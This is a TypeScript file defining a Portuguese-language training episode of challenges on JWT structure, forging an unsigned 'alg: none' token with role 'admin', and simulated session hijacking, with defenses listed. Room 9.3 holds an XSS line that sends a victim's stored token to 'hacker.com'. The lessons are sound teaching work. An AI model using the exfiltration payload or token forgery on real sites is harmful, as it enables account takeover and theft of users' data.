import type { Challenge, CodeChallenge, TheoryChallenge } from '@/types/challenge';

const theory9_0: TheoryChallenge = {
  id: '9.0',
  type: 'theory',
  episode: 9,
  room: '9.0',
  title: 'Episódio 9 — JWT Tokens e Session Hijacking',
  description: 'JWT é o padrão de autenticação mais usado hoje. Vamos entender como funciona, decodificar e explorar vulnerabilidades.',
  content: `
**O que é JWT (JSON Web Token)?**
JWT é um token auto-contido que carrega informações do usuário.

**Estrutura:**
\`header.payload.signature\`

**Exemplo real:**
\`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\`

**Partes:**
1. **Header:** Tipo e algoritmo (HS256, RS256)
2. **Payload:** Dados do usuário (id, nome, role)
3. **Signature:** Assinatura para garantir integridade

**Por que é popular:**
• Stateless (servidor não guarda sessão)
• Escalável
• Usado por: Google, Facebook, Netflix, etc

**Vulnerabilidades:**
• Algoritmo "none" aceito
• Chave secreta fraca
• Sem validação de expiração

Vamos explorar!
  `,
};

const code9_1: CodeChallenge = {
  id: '9.1',
  type: 'code',
  episode: 9,
  room: '9.1',
  title: 'Decodificando um JWT',
  description: 'JWT parece código aleatório, mas na verdade é Base64! Vamos decodificar e ver o conteúdo.',
  instructions: 'Execute e veja o interior de um JWT',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `// JWT de exemplo
const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE";

// JWT tem 3 partes separadas por "."
const partes = jwt.split('.');

console.log("=== Decodificando JWT ===\\n");

// Decodificar header (parte 1)
const header = JSON.parse(atob(partes[0]));
console.log("📋 Header:");
console.log(JSON.stringify(header, null, 2));

// Decodificar payload (parte 2)
const payload = JSON.parse(atob(partes[1]));
console.log("\\n📦 Payload (dados do usuário):");
console.log(JSON.stringify(payload, null, 2));

// Signature não decodificamos (é hash)
console.log("\\n🔐 Signature: " + partes[2]);
`,
    python: `import base64
import json

# JWT de exemplo
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE"

# JWT tem 3 partes separadas por "."
partes = jwt.split('.')

print("=== Decodificando JWT ===\\n")

# Decodificar header (parte 1)
header = json.loads(base64.b64decode(partes[0] + '==').decode('utf-8'))
print("📋 Header:")
print(json.dumps(header, indent=2))

# Decodificar payload (parte 2)
payload = json.loads(base64.b64decode(partes[1] + '==').decode('utf-8'))
print("\\n📦 Payload (dados do usuário):")
print(json.dumps(payload, indent=2))

# Signature não decodificamos (é hash)
print(f"\\n🔐 Signature: {partes[2]}")
`,
  },
  expectedOutput: '📦 Payload (dados do usuário):\n{\n  "userId": 1,\n  "username": "john",\n  "role": "user"\n}',
  explanation: `
**JWT decodificado!**

**Descobrimos:**
• userId: 1
• username: "john"
• role: "user" (não é admin!)

**Importante:**
Decodificar NÃO é o mesmo que quebrar!
A signature protege contra modificações.

**Mas e se pudéssemos modificar o role para "admin"?** 🤔
Próxima sala vamos tentar isso!
  `,
  hints: [
    'JWT é apenas Base64 - não é criptografia!',
    'Qualquer um pode LER um JWT, mas não MODIFICAR (por causa da signature)',
  ],
  difficulty: 'easy',
};

const code9_2: CodeChallenge = {
  id: '9.2',
  type: 'code',
  episode: 9,
  room: '9.2',
  title: 'Vulnerabilidade: algoritmo "none"',
  description: 'Alguns servidores aceitam JWT com algoritmo "none" (SEM assinatura!). Isso permite modificar o token livremente.',
  instructions: 'Execute e veja como criar um JWT malicioso',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `// Crie um JWT malicioso com algoritmo "none" (sem assinatura)

// 1. Crie o objeto header com: alg: "none", typ: "JWT"

// 2. Crie o objeto payload com: userId: 1, username: "john", role: "admin"
//    (mudamos "user" para "admin"!)

// 3. Codifique header e payload em Base64 com btoa(JSON.stringify(...))

// 4. Monte o JWT: headerB64 + "." + payloadB64 + "."
//    (termina com "." porque não tem signature)

// 5. Imprima o token e depois: "\\n⚠️ Agora você é ADMIN sem senha!"
`,
    python: `import base64
import json

# Crie um JWT malicioso com algoritmo "none" (sem assinatura)

# 1. Crie o dicionário header com: "alg": "none", "typ": "JWT"

# 2. Crie o dicionário payload com: "userId": 1, "username": "john", "role": "admin"
#    (mudamos "user" para "admin"!)

# 3. Codifique header e payload em Base64:
#    base64.b64encode(json.dumps(obj).encode()).decode().rstrip('=')

# 4. Monte o JWT: f"{header_b64}.{payload_b64}."
#    (termina com "." porque não tem signature)

# 5. Imprima o token e depois: "\\n⚠️ Agora você é ADMIN sem senha!"
`,
  },
  expectedOutput: '⚠️ Agora você é ADMIN sem senha!',
  explanation: `
**VULNERABILIDADE CRÍTICA!**

**O que fizemos:**
1. Mudamos role de "user" para "admin"
2. Usamos algoritmo "none" (sem assinatura)
3. Servidor aceitou = privilégio escalado!

**Casos reais:**
• 2015 - Auth0 tinha essa vulnerabilidade
• Várias bibliotecas JWT aceitavam "none" por padrão

**Defesa:**
• Nunca aceitar algoritmo "none"
• Validar algoritmo rigorosamente
• Usar bibliotecas atualizadas

**Ferramentas:**
• jwt.io (decodificar)
• jwt_tool (exploração)
  `,
  hints: [
    'Crie header: const header = { alg: "none", typ: "JWT" }',
    'Crie payload com role: "admin" em vez de "user"',
    'Use btoa(JSON.stringify(header)) para codificar em Base64',
    'Monte: headerB64 + "." + payloadB64 + "." (sem signature)',
  ],
  difficulty: 'easy',
};

const theory9_3: TheoryChallenge = {
  id: '9.3',
  type: 'theory',
  episode: 9,
  room: '9.3',
  title: 'Session Hijacking',
  description: 'Roubando tokens JWT para sequestrar sessões de outros usuários.',
  content: `
**O que é Session Hijacking?**
Roubar o token/cookie de sessão de alguém e usar para se passar por ela.

**Métodos de roubo:**

**1. XSS (Cross-Site Scripting):**
\`<script>fetch('http://hacker.com?token=' + localStorage.getItem('jwt'))</script>\`

**2. Man-in-the-Middle (MitM):**
Interceptar tráfego em WiFi público

**3. Session Sniffing:**
Capturar pacotes de rede (Wireshark)

**4. Phishing:**
Site falso captura token

**5. Malware:**
Keylogger ou browser extension malicioso

**Consequências:**
• Hacker acessa conta da vítima
• Pode mudar senha, roubar dados
• Vítima não percebe (sessão continua ativa)

**Defesas:**
• HttpOnly cookies (JS não acessa)
• HTTPS obrigatório
• Token rotation (troca periódica)
• IP validation
• Device fingerprinting

**Próxima sala:** Simular um ataque de session hijacking!
  `,
};

const code9_4: CodeChallenge = {
  id: '9.4',
  type: 'code',
  episode: 9,
  room: '9.4',
  title: 'Simulando session hijacking',
  description: 'Você roubou um JWT de uma vítima via XSS. Agora use esse token para acessar dados confidenciais.',
  instructions: 'Execute e veja o ataque funcionando',
  languages: ['javascript', 'python'],
  starterCode: {
    javascript: `// Token roubado da vítima (via XSS)
const tokenRoubado = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OSwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE";

// Dados confidenciais que o servidor retornaria
const dadosConfidenciais = [
  { user: "joao", cpf: "111.222.333-44", saldo: "R$ 5.000" },
  { user: "maria", cpf: "555.666.777-88", saldo: "R$ 12.000" }
];

// 1. Decodifique o payload do JWT (segunda parte, separada por ".")
//    Use: JSON.parse(atob(tokenRoubado.split('.')[1]))
// 2. Imprima os dados do payload para ver de quem é o token
// 3. Simule a requisição: imprima a URL e o header Authorization
// 4. Imprima os dados confidenciais com JSON.stringify()
// 5. No final, imprima: "\\n⚠️ Session hijacking bem-sucedido!"
`,
    python: `import base64
import json

# Token roubado da vítima (via XSS)
token_roubado = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OSwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE"

# Dados confidenciais que o servidor retornaria
dados_confidenciais = [
    {"user": "joao", "cpf": "111.222.333-44", "saldo": "R$ 5.000"},
    {"user": "maria", "cpf": "555.666.777-88", "saldo": "R$ 12.000"}
]

# 1. Decodifique o payload do JWT (segunda parte, separada por ".")
#    Use: json.loads(base64.b64decode(token_roubado.split('.')[1] + '==').decode())
# 2. Imprima os dados do payload para ver de quem é o token
# 3. Simule a requisição: imprima a URL e o header Authorization
# 4. Imprima os dados confidenciais com json.dumps()
# 5. No final, imprima: "\\n⚠️ Session hijacking bem-sucedido!"
`,
  },
  expectedOutput: '⚠️ Session hijacking bem-sucedido!',
  explanation: `
**ATAQUE COMPLETO!**

**O que aconteceu:**
1. Roubamos JWT via XSS
2. Token tinha role="admin"
3. Usamos para acessar endpoint /api/admin/usuarios
4. Servidor validou token = acesso total!

**Impacto real:**
• Acesso a dados financeiros
• CPFs, cartões, senhas
• Controle total da conta

**Como empresas detectam:**
• Monitorar IP changes
• Device fingerprinting
• Behavioral analysis (padrões de uso)

**Caso real:**
2020 - Zoom teve vulnerabilidade de session hijacking.
Hackers roubavam tokens de reuniões.
  `,
  hints: [
    'Separe o JWT com .split(".") e pegue a parte [1] (payload)',
    'Use atob() ou base64.b64decode() para decodificar o payload',
    'O token pertence ao Admin - role="admin"',
    'No final imprima: "⚠️ Session hijacking bem-sucedido!"',
  ],
  difficulty: 'easy',
};

const theory9_5: TheoryChallenge = {
  id: '9.5',
  type: 'theory',
  episode: 9,
  room: '9.5',
  title: 'Episódio 9 completo!',
  description: 'Você domina JWT e técnicas de session hijacking!',
  content: `
**Habilidades desbloqueadas:**
✅ JWT (estrutura, decodificação)
✅ Vulnerabilidade "algorithm: none"
✅ Session hijacking
✅ Roubo de tokens via XSS

**Conhecimento de nível intermediário:**
Você agora entende como:
• Autenticação moderna funciona
• Atacantes sequestram sessões
• Defender aplicações contra esses ataques

**Carreira - Bug Bounty:**
JWT vulnerabilities pagam MUITO bem:
• $500 - $5,000 por vulnerabilidade
• Companies: Uber, Airbnb, Twitter

**Certificações:**
• eWPT (Web Application Pentesting)
• OSWE (Offensive Security Web Expert)

**Ferramentas profissionais:**
• Burp Suite + JWT extensions
• jwt_tool
• Postman

**Próximo episódio:**
Esteganografia - escondendo dados secretos em imagens e arquivos!

Você está ficando avançado! 🔥
  `,
};

export const episode9Challenges: Challenge[] = [
  theory9_0,
  code9_1,
  code9_2,
  theory9_3,
  code9_4,
  theory9_5,
];
